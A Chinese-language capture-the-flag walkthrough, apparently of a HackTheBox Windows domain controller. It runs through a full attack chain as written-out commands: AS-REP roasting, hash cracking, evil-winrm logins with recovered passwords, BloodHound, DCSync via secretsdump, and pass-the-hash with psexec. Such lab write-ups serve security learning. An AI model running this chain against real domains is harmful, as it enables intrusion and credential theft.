针对目标服务器进行端口探测

```
sudo nmap -p- --min-rate 10000 10.10.10.175
```

![image-20241021145015676](https://s2.loli.net/2024/10/21/2ofXPOuVez4Kkxr.png)

针对开放的端口进行进一步服务探测

```
sudo nmap -p53,80,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49676,49689,4969,49795 -A 10.10.10.175 -oX
sanua.xml
```

![image-20241021145253801](https://s2.loli.net/2024/10/21/8qc5QS4UdOAEFTM.png)

通过LDAP进行扫描

```
ldapsearch -x -s base namingcontexts -H ldap://10.10.10.175:389
```

![image-20241021154824806](https://s2.loli.net/2024/10/21/7LRY5TSA9t4lKhN.png)

```
ldapsearch -x -b"DC=EGOTISTICAL-BANK,DC=LOCAL" -H ldap://10.10.10.175:389
```

![image-20241021155444166](https://files.seeusercontent.com/2026/04/07/zO0u/image-20241021155444166.png)

优先添加hosts文件

```
10.10.10.175  EGOTISTICAL-BANK.LOCAL
```

smb匿名登陆能够成功，但无法正常连接，到这步考虑到目标的DC服务器属性，考虑是否会存在用户Kerberos pre-authentication 被关闭的情况，但这种的前提是需要有明确的用户列表，通过ldap扫描，感觉builtin和hugo smith很像用户名称，同时在80网页端口页面找到一个about.html页面，里面存在一些员工名称

![image-20241021171415226](https://s2.loli.net/2024/10/21/dApPbFQHcs9TziZ.png)



将这些姓名复杂保存为单个文件后使用姓名工具，将其变成用户字典

```
/home/zkpc/Tools/username-anarchy/username-anarchy  --input-file users.txt --select-format first,flast,first.last,firstl > user.txt
```

![image-20241021171507740](https://s2.loli.net/2024/10/21/ZIdkB9HYPXhenQq.png)

使用impacket工具包，查看哪个用户没有开启对应pre-authentication

```
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile user.txt -dc-ip 10.10.10.175
```

![image-20241021172002398](https://files.seeusercontent.com/2026/04/07/8tjW/image-20241021172002398.png)

可以看到fsmith这个用户名没有开启，并且获取了对应的hash，对相应的hash值进行破解

```
sudo john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![image-20241021172221599](https://files.seeusercontent.com/2026/04/06/Yo9u/image-20241021172221599.png)

破解获取对应的用户和密码

```
user:fsmith
pass:Thestrokes23
```

使用netexec验证登录

![image-20241021172339443](https://s2.loli.net/2024/10/21/fQIauEbvsF2wt1q.png)

可以进行登录，使用evil-winrm进行登录

```
evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'
```

![image-20241021173110502](https://s2.loli.net/2024/10/21/vVlKbF9OpgX1sMW.png)

到对应的目录下获取对应的flag

接着我们需要进行提权，优先看下现有用户

```
net user /domain
```

![image-20241021173549988](https://s2.loli.net/2024/10/21/2C1OnsUQ4MXJLuY.png)

目标服务器是一台DC服务器，故优先使用bloodhound-python工具进行信息收集

```
bloodhound-python -d 'EGOTISTICAL-BANK.LOCAL' -u 'fsmith' -p 'Thestrokes23' -c all -ns 10.10.10.175
```

根据收集的信息，svc_loanmgr具备危险的权限可以进行DC权限的获取

![image-20241021174805223](https://s2.loli.net/2024/10/21/ylPhgUSwWcJC1ID.png)



fsmith账户对 enterprise admins这个组具备genericall权限，下图为fsmith目前的权限组

![image-20241021175244945](https://s2.loli.net/2024/10/21/oflSkTwGrcYinVA.png)

考虑要从fsmith切换到svc_loanmgr，上传winpeas进行相应信息收集

```
upload winPEASany.exe
.\winPEASany.exe
```

![image-20241021204837521](https://s2.loli.net/2024/10/21/7Ew21BWQIj8GSUd.png)

找到了svc_loanmangerd的账号密码

user:svc_loanmgr

pass:Moneymakestheworldgoround!

```
evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'
```

![image-20241021205447101](https://s2.loli.net/2024/10/21/H6gT4laq35z1Qf7.png)

成功进行了登录，根据上述的bloodhound信息，我们可以通过这个账户来获取DC权限

```
impacket-secretsdump 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
```

![image-20241021205701211](https://s2.loli.net/2024/10/21/djCaoFm1KA6Owyc.png)

获取到administrator的密码hash后，进行登录

```
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e administrator@10.10.10.175 cmd.exe
```

![image-20241021210817423](https://s2.loli.net/2024/10/21/RXwmza5PvbNQqBH.png)
